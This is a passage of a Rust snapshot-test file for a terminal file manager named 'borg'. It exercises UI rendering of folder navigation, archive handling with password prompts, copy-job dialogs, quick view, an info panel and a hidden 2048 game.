    let buffer = stage.render(stage.started + Duration::from_secs_f32(flash))?;
    ensure_text(&buffer, "In memory of Sir Patrick Stewart")?;
    check("empty_folder_remembrance", &stage, buffer)?;
    let large = GridSize { cols: 150, rows: 52 };
    let settings = Settings { motion: Motion::STILL, preferences: QUIET, ..Settings::default() };
    let dirs = [PathBuf::from("/home/me/projects/borg"), PathBuf::from("/var/log")];
    let mut stage = Stage::new(dirs, [Vec::new(), logs()], large, settings, "2026-10-28T12:00:00+00:00[UTC]".parse()?)?;
    let buffer = stage.render(stage.started)?;
    check("empty_folder_remembrance_portrait", &stage, buffer)?;
    let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap_or_default();
    stage.state.appearance.select(classic, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("empty_folder_remembrance_classic", &stage, buffer)
}

#[test]
fn loading_shows_spinner_and_comet() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::Down));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
    let Some(borg_core::Effect::List { side, generation, .. }) = effects.into_iter().next() else {
        anyhow::bail!("entering a folder must list it");
    };
    stage.send(Msg::Batch { side, generation, entries: logs() });
    let quick = Snapshot::from_buffer(stage.render(stage.started + Duration::from_millis(450))?, &stage.palette, None);
    anyhow::ensure!(!quick.contains("loading…"), "work shorter than the spinner delay shows no spinner");
    let buffer = stage.render(stage.started + Duration::from_millis(800))?;
    ensure_text(&buffer, "loading…")?;
    check("loading", &stage, buffer)
}

#[test]
fn entering_a_folder_shows_the_new_listing_at_once() -> Result<()> {
    let mut stage = stage(SIZE, Motion::LOCAL)?;
    stage.send(key(KeyCode::Down));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
    let Some(borg_core::Effect::List { side, generation, .. }) = effects.into_iter().next() else {
        anyhow::bail!("entering a folder must list it");
    };
    stage.send(Msg::Batch { side, generation, entries: logs() });
    stage.send(Msg::Listed { side, generation, error: None });
    let early = describe(&stage.render(stage.started + Motion::LOCAL.fade / 3)?);
    let late = describe(&stage.render(stage.started + Motion::LOCAL.fade * 2)?);
    anyhow::ensure!(early == late, "the listing must not animate in:\n{early}");
    Ok(())
}

fn releases() -> Vec<Entry> {
    (1..=RELEASES).map(|i| entry(&format!("release-{i:02}"), EntryKind::Dir, 4096, RECENT, false)).collect()
}

fn list_after(stage: &mut Stage, msg: Msg, entries: Vec<Entry>) -> Result<()> {
    let effects = borg_core::update(&mut stage.state, msg, stage.started);
    let Some(borg_core::Effect::List { side, generation, .. }) =
        effects.into_iter().find(|effect| matches!(effect, borg_core::Effect::List { .. }))
    else {
        anyhow::bail!("the key must list a folder");
    };
    stage.send(Msg::Batch { side, generation, entries });
    stage.send(Msg::Listed { side, generation, error: None });
    Ok(())
}

#[test]
fn leaving_a_folder_shows_the_parent_as_it_was_when_entered() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, releases(), CLOCK)?;
    for _ in 0..RELEASES * 3 / 4 {
        stage.send(key(KeyCode::Down));
    }
    for _ in 0..RELEASES / 8 {
        stage.send(key(KeyCode::Up));
    }
    let entered = describe(&stage.render(stage.started)?);
    list_after(&mut stage, key(KeyCode::Enter), logs())?;
    list_after(&mut stage, key(KeyCode::Enter), releases())?;
    let buffer = stage.render(stage.started)?;
    anyhow::ensure!(describe(&buffer) == entered, "the parent must look as it did:\n{entered}");
    check("returned_to_parent", &stage, buffer)
}

#[test]
fn menu_opens_immediately() -> Result<()> {
    let mut stage = stage(SIZE, Motion::LOCAL)?;
    stage.send(key(KeyCode::F(2)));
    let buffer = stage.render(stage.started + Motion::LOCAL.fade / 3)?;
    check("menu_immediate", &stage, buffer)
}

#[test]
fn without_truecolor_every_colour_is_indexed() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.state.settings.truecolor = false;
    let neon = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap_or_default();
    stage.state.appearance.select(neon, stage.started, Duration::ZERO);
    stage.send(key(KeyCode::F(8)));
    let buffer = stage.render(stage.started)?;
    let truecolor = buffer.content.iter().any(|cell| {
        matches!(cell.fg, ratatui::style::Color::Rgb(..)) || matches!(cell.bg, ratatui::style::Color::Rgb(..))
    });
    anyhow::ensure!(!truecolor, "256-colour terminals must not receive 24-bit colours");
    Ok(())
}

fn ensure_text(buffer: &Buffer, needle: &str) -> Result<()> {
    let text = describe(buffer);
    anyhow::ensure!(text.contains(needle), "expected {needle:?} in\n{text}");
    Ok(())
}

#[test]
fn dialogs_close_immediately() -> Result<()> {
    let mut stage = stage(SIZE, Motion::LOCAL)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::F(8)));
    let closing = stage.started + Motion::LOCAL.fade;
    borg_core::update(&mut stage.state, key(KeyCode::Esc), closing);
    let buffer = stage.render(closing + Motion::LOCAL.fade / 3)?;
    check("dialog_closed", &stage, buffer)
}

fn sunset(width: u32, height: u32) -> Result<borg_gfx::Picture> {
    let pixel = |x: u32, y: u32| {
        let t = y as f32 / height as f32;
        let (dx, dy) = (x as f32 - width as f32 * 0.5, y as f32 - height as f32 * 0.62);
        let sun = (dx * dx + dy * dy).sqrt() < height as f32 * 0.22;
        let sky = [255.0 * (0.25 + 0.75 * t), 80.0 + 60.0 * t, 160.0 * (1.0 - t) + 40.0];
        let [r, g, b] = if sun { [255.0, 210.0, 90.0] } else { sky };
        [r as u8, g as u8, b as u8, u8::MAX]
    };
    let rgba = (0..height).flat_map(|y| (0..width).flat_map(move |x| pixel(x, y))).collect();
    Ok(borg_gfx::Picture::from_rgba(width, height, rgba)?)
}

/// Shows `viewer` as if the file it holds had been asked for and loaded.
fn opened(stage: &mut Stage, viewer: borg_core::Viewer) {
    stage.state.opening = viewer.path().map(PathBuf::from);
    stage.send(Msg::Opened(viewer));
}

fn open_picture(stage: &mut Stage) -> Result<()> {
    let image =
        borg_core::Image { picture: sunset(320, 180)?, original: (3840, 2160), format: "jpg", bytes: 2_411_724 };
    let path = PathBuf::from("/home/me/projects/borg/sunset.jpg");
    opened(stage, borg_core::Viewer::new(path, borg_core::Content::Image(image)));
    Ok(())
}

#[test]
fn picture_viewer_draws_half_blocks_without_graphics() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    open_picture(&mut stage)?;
    let (buffer, placements) = stage.compose(stage.started)?;
    anyhow::ensure!(placements.is_empty(), "cells mode must not place images");
    ensure_text(&buffer, "3840×2160 · JPG · 2.3M")?;
    check("picture_cells", &stage, buffer)
}

#[test]
fn picture_viewer_places_pixels_with_graphics() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.pixels = borg_ui::Pixels::Pictures;
    open_picture(&mut stage)?;
    let (buffer, placements) = stage.compose(stage.started)?;
    anyhow::ensure!(placements.len() == 1, "expected one placement, got {placements:?}");
    anyhow::ensure!(!describe(&buffer).contains('▀'), "pixel mode must leave the picture area to the terminal");
    check_with("picture_pixels", &stage, buffer, placements)
}

#[test]
fn nerd_font_icons() -> Result<()> {
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    let neon = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap_or_default();
    stage.state.appearance.select(neon, stage.started, Duration::ZERO);
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    check("icons", &stage, buffer)
}

#[test]
fn quick_find_highlights_matches() -> Result<()> {
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    stage.send(ctrl('s'));
    chars("o").for_each(|msg| {
        stage.send(msg);
    });
    stage.send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Find  o")?;
    ensure_text(&buffer, " 2/4 ")?;
    check("quick_find", &stage, buffer)
}

fn select_theme(stage: &mut Stage, id: &str) {
    let index = stage.state.appearance.choices().iter().position(|c| c.id == id).unwrap_or_default();
    stage.state.appearance.select(index, stage.started, Duration::ZERO);
}

#[test]
fn graphics_enabled_panels_and_dialogs_use_only_terminal_cells() -> Result<()> {
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    stage.pixels = borg_ui::Pixels::Pictures;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    for id in ["neon", "midnight"] {
        select_theme(&mut stage, id);
        let (buffer, placements) = stage.compose(stage.started)?;
        anyhow::ensure!(placements.is_empty(), "panels must not transmit images");
        anyhow::ensure!(
            describe(&buffer)
                .lines()
                .nth(usize::from(stage.state.layout(stage.started).panels[0].y))
                .unwrap_or_default()
                .contains('╭')
        );
    }
    stage.send(key(KeyCode::F(8)));
    let (buffer, placements) = stage.compose(stage.started)?;
    anyhow::ensure!(placements.is_empty(), "dialogs must not transmit images");
    ensure_text(&buffer, "Delete")?;
    Ok(())
}

/// Long enough after the last keystroke for the password field to calm down.
const PASSWORD_SETTLED: Duration = Duration::from_millis(1300);
const ARCHIVE: &str = "/home/me/projects/borg/site.zip";
const GIB: u64 = 1 << 30;
const MIB: u64 = 1 << 20;

fn archive_stage() -> Result<Stage> {
    let left = vec![
        entry("docs", EntryKind::Dir, 4096, OLD, false),
        entry("site.zip", EntryKind::File, 42_000_000, RECENT, false),
    ];
    staged(Motion::STILL, QUIET, left, CLOCK)
}

/// Enter on the archive, and the listing it asks for.
fn open_archive(stage: &mut Stage) -> Result<(borg_core::Side, u64)> {
    stage.send(key(KeyCode::End));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
    effects
        .into_iter()
        .find_map(|effect| match effect {
            borg_core::Effect::List { side, generation, .. } => Some((side, generation)),
            _ => None,
        })
        .context("Enter on an archive must list it")
}

fn archive_entries() -> Vec<Entry> {
    let usage = borg_vfs::FolderUsage { files: 12, folders: 2, ..Default::default() };
    vec![
        Entry { usage: Some(usage), ..entry("docs", EntryKind::Dir, 1_480_000, OLD, false) },
        entry("index.html", EntryKind::File, 18_400, RECENT, false),
        entry("readme.md", EntryKind::File, 2_100, RECENT, false),
    ]
}

#[test]
fn an_archive_reads_opens_asks_for_its_password_and_warns_before_unpacking() -> Result<()> {
    let mut stage = archive_stage()?;
    let (side, generation) = open_archive(&mut stage)?;
    stage.send(Msg::ArchiveReading { side, generation, read: 18_000_000, total: 42_000_000 });
    let buffer = stage.render(stage.started + Duration::from_millis(800))?;
    ensure_text(&buffer, "site.zip")?;
    check("archive_reading", &stage, buffer)?;

    let format = borg_archive::Format::Zip;
    stage.send(Msg::ArchiveOpened { side, generation, format, left_out: 0 });
    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
    stage.send(Msg::Listed { side, generation, error: None });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "▤ zip")?;
    ensure_text(&buffer, "readme.md")?;
    check("archive_panel", &stage, buffer)?;

    stage.send(key(KeyCode::End)).send(key(KeyCode::F(5)));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
    let id = effects
        .iter()
        .find_map(|effect| match effect {
            borg_core::Effect::StartUnpack { id, .. } => Some(*id),
            _ => None,
        })
        .context("F5 in an archive must unpack")?;
    let expand = borg_jobs::Ask::Expand {
        archive: PathBuf::from(ARCHIVE),
        packed: 42_000_000,
        unpacked: 64 * GIB,
        files: 250_000,
    };
    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(expand) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Unpack anyway")?;
    check("archive_expand", &stage, buffer)?;

    stage.send(key(KeyCode::Char('u')));
    let room = borg_jobs::Ask::Room { target: PathBuf::from("/var/log"), needed: 64 * GIB, free: 12 * GIB };
    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(room) });
    let buffer = stage.render(stage.started)?;
    check("archive_room", &stage, buffer)?;

    stage.send(key(KeyCode::Char('u')));
    let slow = borg_jobs::Ask::Slow {
        path: PathBuf::from(ARCHIVE),
        file: true,
        bytes: 64 * GIB,
        estimate: Duration::from_secs(25 * 60),
        kind: borg_drives::DriveKind::HardDrive,
    };
    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(slow) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "About 25 minutes for 64G on a hard drive.")?;
    ensure_text(&buffer, "Always for this file")?;
    check("archive_slow", &stage, buffer)?;

    let (stage, buffer) = typed_password("hunter2")?;
    anyhow::ensure!(!describe(&buffer).contains("hunter2"), "the password must stay hidden");
    let (_, other) = typed_password("letmein")?;
    anyhow::ensure!(other == buffer, "the noise must not depend on what was typed");
    check("archive_password", &stage, buffer)
}

#[test]
fn a_long_job_question_for_a_save_shows_over_the_full_screen_editor() -> Result<()> {
    use borg_core::{EditorFile, EditorSlot, FileStamp, PackedFile};
    let mut stage = archive_stage()?;
    let (side, generation) = open_archive(&mut stage)?;
    stage.send(Msg::ArchiveOpened { side, generation, format: borg_archive::Format::Zip, left_out: 0 });
    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
    stage.send(Msg::Listed { side, generation, error: None });
    stage.send(key(KeyCode::End)).send(key(KeyCode::F(4)));
    let slot = EditorSlot::Screen;
    let scratch = PathBuf::from("/run/borg/archive-view/edit-1/readme.md");
    let text = "# Site\n\nRead me first.\n";
    let stamp = FileStamp { len: text.len() as u64, modified: None, inode: 1 };
    let shown = PathBuf::from(ARCHIVE).join("readme.md");
    let packed = PackedFile { archive: PathBuf::from(ARCHIVE), password: None, entry: "readme.md".into(), shown };
    let file = EditorFile { path: scratch, text: text.into(), stamp };
    stage.send(Msg::ArchiveEditorOpened { slot, packed, result: Ok(file) });
    stage.send(key(KeyCode::F(2)));
    let effects = borg_core::update(&mut stage.state, Msg::EditorSaved(slot, Ok(stamp)), stage.started);
    let id = effects
        .iter()
        .find_map(|effect| match effect {
            borg_core::Effect::StartRewrite { id, .. } => Some(*id),
            _ => None,
        })
        .context("a save in an archive must start a job")?;
    let slow = borg_jobs::Ask::Slow {
        path: PathBuf::from(ARCHIVE),
        file: true,
        bytes: 42_000_000,
        estimate: Duration::from_secs(3 * 60),
        kind: borg_drives::DriveKind::Network,
    };
    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(slow) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Read me first.")?;
    ensure_text(&buffer, "Always for this file")?;
    check("archive_save_slow_over_editor", &stage, buffer)
}

/// The password prompt after typing `password`, drawn once its flare has passed.
fn typed_password(password: &str) -> Result<(Stage, Buffer)> {
    let mut stage = archive_stage()?;
    let (side, generation) = open_archive(&mut stage)?;
    stage.send(Msg::ArchiveLocked { side, generation, wrong: true });
    for msg in chars(password) {
        stage.send(msg);
    }
    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
    Ok((stage, buffer))
}

#[test]
fn leaving_a_folder_of_an_archive_that_went_away_returns_beside_it() -> Result<()> {
    const GONE: &str = "No such file or directory (os error 2)";
    let mut stage = archive_stage()?;
    let (side, generation) = open_archive(&mut stage)?;
    stage.send(Msg::ArchiveOpened { side, generation, format: borg_archive::Format::Zip, left_out: 0 });
    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
    stage.send(Msg::Listed { side, generation, error: None });
    stage.send(key(KeyCode::Home)).send(key(KeyCode::Down));
    list_after(&mut stage, key(KeyCode::Enter), vec![entry("guide.md", EntryKind::File, 2_100, RECENT, false)])?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Left), stage.started);
    let (side, generation) = effects
        .into_iter()
        .find_map(|effect| match effect {
            borg_core::Effect::List { side, generation, .. } => Some((side, generation)),
            _ => None,
        })
        .context("leaving the folder must list the archive's top")?;
    let left = vec![entry("docs", EntryKind::Dir, 4096, OLD, false)];
    list_after(&mut stage, Msg::Listed { side, generation, error: Some(GONE.into()) }, left)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, GONE)?;
    anyhow::ensure!(!describe(&buffer).contains("▤ zip"), "the panel must leave the archive");
    check("archive_gone", &stage, buffer)
}

fn running_copy(stage: &mut Stage) -> Result<u64> {
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
    stage.send(key(KeyCode::F(5)));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
    let Some(borg_core::Effect::StartJob { id, .. }) = effects.first() else { anyhow::bail!("copy must start a job") };
    let progress = borg_jobs::Progress {
        done: borg_jobs::Totals { files: 41, bytes: 1_610_612_736 },
        total: borg_jobs::Totals { files: 120, bytes: 4_294_967_296 },
        current: PathBuf::from("/home/me/projects/borg/build.sh"),
    };
    stage.send(Msg::Job { id: *id, event: borg_jobs::Event::Progress(progress) });
    Ok(*id)
}

#[test]
fn copy_job_progress_and_conflict() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let id = running_copy(&mut stage)?;
    let later = stage.started + Duration::from_secs(20);
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "Copying 37% · 77M/s · 0:34")?;
    ensure_text(&buffer, "Alt-J Copying 37%")?;
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    let (column, row) = shot.find("Alt-J Copying").unwrap();
    let click = crossterm::event::MouseEvent {
        column,
        row,
        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
        modifiers: KeyModifiers::NONE,
    };
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click, false, later),
        Some(Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::Jobs)))
    ));
    check("job_progress", &stage, buffer)?;

    let ask = borg_jobs::Ask::Conflict {
        source: PathBuf::from("/home/me/projects/borg/build.sh"),
        target: PathBuf::from("/var/log/build.sh"),
        sizes: (310, 128),
        newer: true,
    };
    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(ask) });
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "Overwrite all")?;
    ensure_text(&buffer, "Alt-J Waiting for you")?;
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    check("job_conflict", &stage, buffer)?;

    let (column, row) = shot.find("[ Skip ]").unwrap();
    let skip = borg_ui::mouse_input(&stage.state, crossterm::event::MouseEvent { column, row, ..click }, false, later);
    assert!(matches!(skip, Some(Msg::Key(KeyEvent { code: KeyCode::Char('s'), .. }))), "{skip:?}");
    stage.send(skip.unwrap());
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::ALT)));
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "p pause · c cancel")?;
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    let at = |text: &str| {
        let (column, row) = shot.find(text).unwrap();
        borg_ui::mouse_input(&stage.state, crossterm::event::MouseEvent { column, row, ..click }, false, later)
    };
    assert!(matches!(at("Copying"), Some(Msg::Pointer(borg_core::Pointer::DialogRow(0)))));
    assert!(matches!(at("c cancel"), Some(Msg::Key(KeyEvent { code: KeyCode::Char('c'), .. }))));
    assert!(
        matches!(
            borg_ui::mouse_input(
                &stage.state,
                crossterm::event::MouseEvent { column: 0, row: 1, ..click },
                false,
                later
            ),
            Some(Msg::Pointer(borg_core::Pointer::DismissDialog))
        ),
        "a click beside the list closes it"
    );
    check("job_list", &stage, buffer)
}

fn peek(stage: &mut Stage, aside: borg_core::Aside, peek: borg_core::Peek) -> Result<()> {
    let panel = stage.state.active_panel();
    let Some(borg_core::Row::Entry(entry)) = panel.hovered() else { anyhow::bail!("the cursor must be on an entry") };
    let path = panel.dir().join(&entry.name);
    stage.send(Msg::Peeked(borg_core::Peeked { aside, path, at: None, peek }));
    Ok(())
}

fn hover(stage: &mut Stage, name: &str) {
    stage.send(key(KeyCode::Home));
    while stage.state.active_panel().hovered_entry().is_none_or(|entry| entry.name != name) {
        stage.send(key(KeyCode::Down));
    }
}

#[test]
fn quick_view_shows_text_folders_and_pictures() -> Result<()> {
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    hover(&mut stage, "Cargo.toml");
    stage.send(ctrl('q'));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Quick view")?;
    let manifest = ["[package]", "name = \"borg\"", "version = \"0.1.0\"", "", "[dependencies]", "ratatui = \"0.30\""];
    peek(
        &mut stage,
        borg_core::Aside::QuickView,
        borg_core::Peek::Text(borg_view::Pager::for_path(
            std::sync::Arc::new(manifest.join("\n").into_bytes()),
            std::path::Path::new("Cargo.toml"),
            43,
            15,
        )?),
    )?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Quick view · Cargo.toml")?;
    ensure_text(&buffer, "ratatui = \"0.30\"")?;
    check("quick_view_text", &stage, buffer)?;

    hover(&mut stage, "src");
    let entries = vec![
        entry("ui", EntryKind::Dir, 4096, RECENT, false),
        entry("main.rs", EntryKind::File, 2_048, RECENT, false),
        entry("lib.rs", EntryKind::File, 12_288, RECENT, false),
    ];
    let folder = borg_core::Peek::Folder { folders: 1, files: 2, bytes: 14_336, entries };
    peek(&mut stage, borg_core::Aside::QuickView, folder)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 folder · 2 files · 14K")?;
    check("quick_view_folder", &stage, buffer)?;

    hover(&mut stage, "README.md");
    stage.pixels = borg_ui::Pixels::Pictures;
    let image =
        borg_core::Image { picture: sunset(320, 180)?, original: (3840, 2160), format: "jpg", bytes: 2_411_724 };
    peek(&mut stage, borg_core::Aside::QuickView, borg_core::Peek::Picture(image))?;
    let (buffer, placements) = stage.compose(stage.started)?;
    anyhow::ensure!(placements.len() == 1, "the picture is placed once, got {placements:?}");
    ensure_text(&buffer, "3840×2160 · JPG · 2.3M")?;
    stage.send(key(KeyCode::F(8)));
    let (_, placements) = stage.compose(stage.started)?;
    anyhow::ensure!(placements.is_empty(), "a dialog hides the picture when cells cannot cover it");
    Ok(())
}

#[test]
fn quick_view_shows_a_binary_as_hex_rows_and_h_shows_its_text() -> Result<()> {
    let files = vec![
        entry("bin", EntryKind::Dir, 4096, RECENT, false),
        entry("image.bin", EntryKind::File, binary_sample().len() as u64, RECENT, false),
        entry("notes.txt", EntryKind::File, 310, OLD, false),
    ];
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, files, CLOCK)?;
    hover(&mut stage, "image.bin");
    stage.send(ctrl('q'));
    let path = std::path::Path::new("image.bin");
    let pager = borg_view::Pager::for_path(std::sync::Arc::new(binary_sample()), path, 43, 15)?;
    peek(&mut stage, borg_core::Aside::QuickView, borg_core::Peek::Text(pager))?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "0000  42 4f 52 47 49 4d 47 00  BORGIMG.")?;
    ensure_text(&buffer, "Tab focus · h text")?;
    check("quick_view_hex", &stage, buffer)?;

    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('h'))).send(key(KeyCode::Tab));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Tab focus · w wrap · h hex")?;
    Ok(())
}

#[test]
fn info_panel_lists_file_facts() -> Result<()> {
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    hover(&mut stage, "build.sh");
    stage.send(ctrl('l'));
    let facts = borg_core::Facts {
        nature: borg_core::Nature::File,
        size: 310,
        permissions: 0o755,
        owner: "me".into(),
        group: "staff".into(),
        modified: at(RECENT),
        accessed: at(RECENT),
        created: at(OLD),
        inode: 1_234_567,
        links: 1,
        items: None,
        disk: Some((128_849_018_880, 499_963_174_912)),
        backup: None,
        drive: Some(borg_drives::Facts {
            drive: borg_drives::Drive {
                id: "disk1".into(),
                kind: borg_drives::DriveKind::SolidState,
                filesystem: "apfs".into(),
                clones: true,
            },
            rates: borg_drives::Rates { read: 2_400 * MIB, write: 1_800 * MIB },
            measured: true,
            asks: false,
        }),
    };
    peek(&mut stage, borg_core::Aside::Info, borg_core::Peek::Info(facts))?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "rwxr-xr-x 0755")?;
    ensure_text(&buffer, "me:staff")?;
    ensure_text(&buffer, "120G of 466G")?;
    ensure_text(&buffer, "SSD · apfs · measured speed")?;
    ensure_text(&buffer, "reads 2.3G/s, writes 1.8G/s")?;
    ensure_text(&buffer, "Borg starts them at once")?;
    check("info_panel", &stage, buffer)
}

#[test]
fn typed_multiline_commands_share_the_prompt_area_with_history() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let before = stage.state.layout(stage.started).panels[0].height;
    stage.shell(b"\x1b[20;1H\x1b]133;A\x07$ \x1b]133;B\x07for file in *.log; do");
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT)));
    stage.shell(b"\r\n    gzip \"$file\"\r\ndone");
    let buffer = stage.render(stage.started)?;
    assert!(stage.state.overlay.is_none());
    assert_eq!(stage.state.layout(stage.started).panels[0].height, before - 2);
    ensure_text(&buffer, "for file in *.log; do")?;
    ensure_text(&buffer, "done")?;
    check("inline_multiline_prompt", &stage, buffer)
}

#[test]
#[ignore = "timing report, run with --ignored --nocapture"]
fn frame_cost() -> Result<()> {
    let big = GridSize { cols: 220, rows: 60 };
    for id in ["midnight", "neon", "paper"] {
        let mut stage = stage(big, Motion::LOCAL)?;
        select_theme(&mut stage, id);
        let rounds = 60u32;
        let start = std::time::Instant::now();
        for i in 0..rounds {
            stage.send(key(if i % 2 == 0 { KeyCode::Down } else { KeyCode::Up }));
            stage.render(stage.started + Duration::from_secs(5))?;
        }
        let plain = start.elapsed() / rounds;
        stage.send(key(KeyCode::F(8)));
        let start = std::time::Instant::now();
        for _ in 0..rounds {
            stage.render(stage.started + Motion::LOCAL.fade / 2)?;
        }
        println!("{id}: cursor move {plain:?} per frame, dialog fading {:?} per frame", start.elapsed() / rounds);
    }
    Ok(())
}

#[test]
fn console_history_and_function_alias_hints() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    for n in 1..=60 {
        stage.shell(format!("output line {n:02}\r\n").as_bytes());
    }
    stage.send(ctrl('o'));
    stage.emulator.scroll(borg_term::Scroll::PageUp);
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Borg console")?;
    ensure_text(&buffer, "Shift-End live")?;
    check("console_history", &stage, buffer)?;
    stage.send(ctrl('o')).send(key(KeyCode::Esc));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1Help")?;
    ensure_text(&buffer, "0Quit")?;
    check("function_alias_hint", &stage, buffer)?;
    let later = stage.started + std::time::Duration::from_secs(2);
    stage.send(Msg::Tick);
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "F1Help")?;
    Ok(())
}

#[test]
fn hidden_2048_modal_themes_states_and_resize() -> Result<()> {
    use borg_core::{Game2048, Overlay, SavedGame2048};
    let saved = |cells| SavedGame2048 { version: 1, cells, score: 12340, best: 25600, random: 42, continued: false };
    let cells = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 0, 0, 0, 0, 0];
    let mut stage = stage(GridSize { cols: 100, rows: 32 }, Motion::STILL)?;
    stage.send(key(KeyCode::F(1)));
    for digit in "2048".chars() {
        stage.send(key(KeyCode::Char(digit)));
    }
    assert!(matches!(stage.state.overlay, Some(Overlay::Game2048)));
    stage.state.game2048 = Game2048::restore(saved(cells));
    for theme in ["neon", "classic", "paper"] {
        select_theme(&mut stage, theme);
        let buffer = stage.render(stage.started)?;
        ensure_text(&buffer, "U Undo")?;
        ensure_text(&buffer, "1024")?;
        check(&format!("game2048_{theme}"), &stage, buffer)?;
    }
    select_theme(&mut stage, "neon");
    stage.state.game2048 = Game2048::restore(saved([11, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Enter to keep playing")?;
    check("game2048_won", &stage, buffer)?;
    stage.state.game2048 = Game2048::restore(saved([1, 2, 1, 2, 2, 1, 2, 1, 1, 2, 1, 2, 2, 1, 2, 1]));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "No moves")?;
    check("game2048_over", &stage, buffer)?;
    stage.state.game2048 = Game2048::restore(saved(cells));
    let before = stage.state.game2048.as_ref().unwrap().saved();
    stage.send(Msg::Resize { cols: NARROW.cols, rows: NARROW.rows });
    stage.emulator.resize(GridSize::console(NARROW.cols, NARROW.rows));
    let buffer = stage.render(stage.started)?;
    check("game2048_compact", &stage, buffer)?;
    for (cols, rows) in [(20, 5), (2, 2), (1, 1), (0, 0), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.emulator.resize(GridSize::console(cols, rows));
        stage.render(stage.started)?;
        assert_eq!(stage.state.game2048.as_ref().unwrap().saved(), before);
    }
    Ok(())
}

#[test]
fn all_overlays_survive_small_terminal_sizes() -> Result<()> {
    for (cols, rows) in [(193, 40), (64, 18), (20, 5), (2, 2), (1, 1), (0, 0)] {
        for code in [KeyCode::F(1), KeyCode::F(5), KeyCode::F(7), KeyCode::F(8), KeyCode::F(9)] {
            let mut stage = stage(SIZE, Motion::STILL)?;
            stage.send(key(KeyCode::Down)).send(key(code));
            stage.send(Msg::Resize { cols, rows });
            stage.emulator.resize(GridSize::console(cols, rows));
            stage.render(stage.started)?;
        }
    }
    Ok(())
}

#[test]
fn wide_keybar_advertises_function_key_alternatives() -> Result<()> {
    let mut stage = stage(GridSize { cols: 193, rows: 40 }, Motion::STILL)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Esc then 1–9/0 = F1–F10")?;
    check("wide_keybar", &stage, buffer)
}

#[test]
